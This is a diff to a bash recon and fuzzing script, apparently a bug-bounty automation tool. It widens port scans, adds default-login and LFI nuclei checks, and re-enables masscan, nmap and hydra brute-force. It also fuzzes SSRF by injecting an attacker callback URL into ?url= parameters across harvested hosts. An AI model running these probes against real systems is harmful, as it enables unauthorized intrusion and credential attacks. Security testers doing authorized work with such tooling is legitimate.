@@ -207,7 +207,7 @@ checkhttprobe(){
   if [[ -n $ip ]]; then
     httpx -silent -ports 0-200,8000-10000 -l $targetDir/dnsprobe_ip.txt -follow-host-redirects -threads 500 -o $targetDir/3-all-subdomain-live-scheme.txt
   else
-    httpx -silent -ports 80,443,100-200,8000,8080 -l $targetDir/dnsprobe_subdomains.txt -follow-host-redirects -threads 500 -o $targetDir/3-all-subdomain-live-scheme.txt
+    httpx -silent -ports 0-200,8000-10000 -l $targetDir/dnsprobe_subdomains.txt -follow-host-redirects -threads 500 -o $targetDir/3-all-subdomain-live-scheme.txt
   fi
 
   # sort -u $targetDir/httpx_output_1.txt $targetDir/httpx_output_2.txt -o $targetDir/3-all-subdomain-live-scheme.txt
@@ -243,8 +243,8 @@ nucleitest(){
                     -exclude ../nuclei-templates/miscellaneous/missing-x-frame-options.yaml \
                     -exclude ../nuclei-templates/miscellaneous/missing-hsts.yaml \
                     -exclude ../nuclei-templates/miscellaneous/missing-csp.yaml \
-                    -exclude ../nuclei-templates/miscellaneous/basic-cors-flash.yaml \
                     -t ../nuclei-templates/takeovers/ \
+                    -t ../nuclei-templates/default-logins/ \
                     -t ../nuclei-templates/exposures/ \
                     -t ../nuclei-templates/exposed-panels/ \
                     -t ../nuclei-templates/exposed-tokens/generic/credentials-disclosure.yaml \
@@ -339,14 +339,18 @@ custompathlist(){
     sort -u $targetDir/wayback/wayback-paths-list.txt $targetDir/gospider/gospider-paths-list.txt -o $customFfufWordList
 
     GREPSCOPE=$(echo $1 | sed "s/\./[.]/")
-    grep -E  "https?[^\"\\'> ]+|www[.][^\"\\'> ]+|$GREPSCOPE|(([[:alpha:][:digit:]-]+\.)+)?[[:alpha:]-]+\.(com|edu|gov|mil|net|org|biz|be|lu|nl|eu|io|co|bg|ru)" $customFfufWordList | sed "s|%3A|:|gi;s|%2F|\/|gi;s|%253A|:|gi;s|%252F|\/|gi;s|%25253A|:|gi;s|%25252F|\/|gi" | uniq > $customFfufPathWordList
+    grep -E  "https?[^\"\\'> ]+|www[.][^\"\\'> ]+" $customFfufWordList | sed "s|%3A|:|gi;s|%2F|\/|gi;s|%253A|:|gi;s|%252F|\/|gi;s|%25253A|:|gi;s|%25252F|\/|gi" | uniq > $customFfufPathWordList
 
-    chown storenth: $customFfufSsrfWordList
+    sleep 1
+
     chown storenth: $customFfufWordList
     chown storenth: $customFfufPathWordList
+    chown storenth: $customFfufSsrfWordList
+    chown storenth: $customFfufLfiWordList
 
     # https://github.com/tomnomnom/gf/issues/55
-    sudo -u storenth helpers/gf-filter.sh $customFfufWordList $customFfufSsrfWordList
+    sudo -u storenth helpers/gf-filter.sh ssrf $customFfufWordList $customFfufSsrfWordList
+    sudo -u storenth helpers/gf-filter.sh lfi $customFfufWordList $customFfufLfiWordList
 
   fi
 }
@@ -362,7 +366,7 @@ ssrftest(){
     echo
     echo "[SSRF-2] Blind probe..."
     # /?url=
-    ffuf -s -c -r -u HOST/\?url=$ATTACKERURL/DOMAIN/image.jpg \
+    ffuf -s -c -r -u HOST/\?url=$ATTACKERURL/DOMAIN \
         -w $targetDir/3-all-subdomain-live-scheme.txt:HOST \
         -w $targetDir/3-all-subdomain-live.txt:DOMAIN -mode pitchfork
 
@@ -416,7 +420,8 @@ ssrftest(){
       #     -w $targetDir/3-all-subdomain-live-scheme.txt:HOST \
       #     -w $targetDir/ssrf-list.txt:PATH > /dev/null
 
-      echo "[SSRF-gf-1] prepare ssrf-list: concat path out from gf ssrf..."
+      # similar to paramspider
+      echo "[SSRF-3] prepare ssrf-list: concat path out from gf ssrf..."
       ITERATOR=0
       while read line; do
         ITERATOR=$((ITERATOR+1))
@@ -433,13 +438,13 @@ ssrftest(){
         echo "HOSTCOUNT=$HOSTCOUNT \t ENDPOINTCOUNT=$ENDPOINTCOUNT"
         echo $(($HOSTCOUNT*$ENDPOINTCOUNT))
 
-          echo "[SSRF-1] fuzz gf ssrf endpoints "
-          ffuf -s -r -c -u HOST/PATH \
+          echo "[SSRF-3] fuzz gf ssrf endpoints "
+          ffuf -s -r -c -t 100 -u HOST/PATH \
               -w $targetDir/3-all-subdomain-live-scheme.txt:HOST \
               -w $targetDir/ssrf-list-1.txt:PATH > /dev/null
       fi
 
-      echo "[SSRF-replace-2] prepare ssrf-list: replacing only interesting urls..."
+      echo "[SSRF-4] prepare ssrf-list: replacing only interesting urls..."
       COUNTER=0
       while read line; do
         COUNTER=$((COUNTER+1))
@@ -487,7 +492,7 @@ ssrftest(){
         ENDPOINTCOUNT=$(cat $targetDir/ssrf-list-2.txt | wc -l)
         echo "HOSTCOUNT=$HOSTCOUNT \t ENDPOINTCOUNT=$ENDPOINTCOUNT"
         echo $(($HOSTCOUNT*$ENDPOINTCOUNT))
-          echo "[SSRF-replace-2] Target url-params probe..."
+          echo "[SSRF-4] Target url-params probe..."
           ffuf -s -r -c -u HOST/PATH \
               -w $targetDir/3-all-subdomain-live-scheme.txt:HOST \
               -w $targetDir/ssrf-list-2.txt:PATH
@@ -498,15 +503,28 @@ ssrftest(){
   fi
 }
 
+# https://www.allysonomalley.com/2021/02/11/burpparamflagger-identifying-possible-ssrf-lfi-insertion-points/
+# https://blog.cobalt.io/a-pentesters-guide-to-file-inclusion-8fdfc30275da
+lfitest(){
+  if [ -s $targetDir/3-all-subdomain-live-scheme.txt ]; then
+    echo
+    echo "[LFI] nuclei testing..."
+    nuclei -stats -debug -v -l $customFfufLfiWordList \
+                    -t ../nuclei-templates/vulnerabilities/other/storenth-lfi.yaml \
+                    -o $targetDir/nuclei/lfi_output.txt
+  fi
+}
 sqlmaptest(){
   if [ "$mad" = "1" ]; then
     # prepare list of the php urls from wayback, hakrawler and gospider
     echo "[sqlmap] prepare sqlist..."
+    sudo -u storenth helpers/gf-filter.sh sqli $customFfufWordList $customFfufSsrfWordList
+
     grep -h -e 'php?[[:alnum:]]*=' -e 'asp?[[:alnum:]]*=' -e '[.]php$' \
                 $targetDir/wayback/wayback_output.txt \
                 $targetDir/gospider/gospider_out.txt \
                 $targetDir/hakrawler/hakrawler_out.txt \
-                |  sort | uniq > $targetDir/sqli_list.txt
+                | sort | uniq > $targetDir/sqli_list.txt
 
     # grep -e 'php?[[:alnum:]]*=' -e 'asp?[[:alnum:]]*=' $targetDir/wayback/wayback_output.txt  | sort | uniq > $targetDir/wayback_sqli_list.txt
 
@@ -631,7 +649,7 @@ recon(){
 
   dnsprobing $1
   checkhttprobe $1
-  aquatoneshot $1
+  # aquatoneshot $1
   nucleitest $1
 
   if [ "$mad" = "1" ]; then
@@ -643,14 +661,15 @@ recon(){
 
   if [[ -n "$fuzz" ]]; then
     ssrftest $1
+    lfitest $1
   fi
 
   # sqlmaptest $1
   # smugglertest $1 # disabled because still manually work need
 
-  # masscantest $1
-  # nmap_nse $1
-  # hydratest $1
+  masscantest $1
+  nmap_nse $1
+  hydratest $1
 
   # ffufbrute $1
 
@@ -660,10 +679,15 @@ recon(){
 
 
 main(){
-  # collect wildcards to retest later
+  # collect wildcard and single targets to retest later
   if [[ -n $wildcard ]]; then
     if ! grep -Fxq $1 $storageDir/wildcard.txt; then
       echo $1 >> $storageDir/wildcard.txt
+    fi
+  fi
+  if [[ -n $single ]]; then
+    if ! grep -Fxq $1 $storageDir/single.txt; then
+      echo $1 >> $storageDir/single.txt
     fi
   fi
 
@@ -693,6 +717,9 @@ main(){
     fi
   fi
   mkdir $targetDir
+  # collect call parameters
+  echo "$@" >> $targetDir/_call_params.txt
+  echo "$@" >> ./_call_log.txt
 
   # used for ffuf bruteforce
   if [ "$mad" = "1" -o "$brute" = "1" ]; then
@@ -700,9 +727,12 @@ main(){
     customFfufWordList=$targetDir/custom_ffuf_wordlist.txt
     # cp $dirsearchWordlist $customFfufWordList
 
-    # to with gf ssrf output
+    # to work with gf ssrf output
     touch $targetDir/custom_ffuf_ssrflist.txt
     customFfufSsrfWordList=$targetDir/custom_ffuf_ssrflist.txt
+    # to work with gf lfi output
+    touch $targetDir/custom_ffuf_lfilist.txt
+    customFfufLfiWordList=$targetDir/custom_ffuf_lfilist.txt
 
     touch $targetDir/custom_ffuf_pathlist.txt
     customFfufPathWordList=$targetDir/custom_ffuf_pathlist.txt
@@ -852,4 +882,4 @@ echo "Check params \$wildcard: $wildcard"
 foldername=recon-$(date +"%y-%m-%d_%H-%M-%S")
 
 # invoke
-main $1
+main "$@"
